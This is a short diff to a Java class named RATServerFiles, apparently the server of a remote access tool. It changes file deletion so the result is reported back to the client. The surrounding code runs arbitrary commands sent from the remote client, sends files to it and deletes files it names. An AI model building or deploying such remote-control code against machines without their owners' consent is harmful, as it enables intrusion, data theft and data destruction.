@@ -34,7 +34,7 @@ public class RATServerFiles {
                         } else if ("DOWNLOAD".equals(command)) {
                             sendFile(out, in.readUTF());
                         } else if ("DELETE".equals(command)) {
-                            deleteFile(in.readUTF());
+                            deleteFile(out, in.readUTF());
                         } else {
                             String output = executeCommand(command);
                             out.writeUTF(output);
@@ -133,14 +133,23 @@ public class RATServerFiles {
     }
     
 
-    private static void deleteFile(String filePath) {
-        File file = new File(filePath);
-        if (file.exists()) {
-            file.delete();
+    private static void deleteFile(DataOutputStream out, String filePath) throws IOException {
+    File file = new File(filePath);
+    if (file.exists()) {
+        if (file.delete()) {
             System.out.println("[Server] File deleted: " + filePath);
+            out.writeUTF("File deleted: " + filePath);
         } else {
-            System.out.println("[Server] File not found: " + filePath);
+            System.out.println("[Server] File could not be deleted: " + filePath);
+            out.writeUTF("File could not be deleted: " + filePath);
         }
+    } else {
+        System.out.println("[Server] File not found: " + filePath);
+        out.writeUTF("File not found: " + filePath);
     }
+    out.writeUTF("END_OF_RESPONSE");
+    out.flush();
+}
+
     
 }
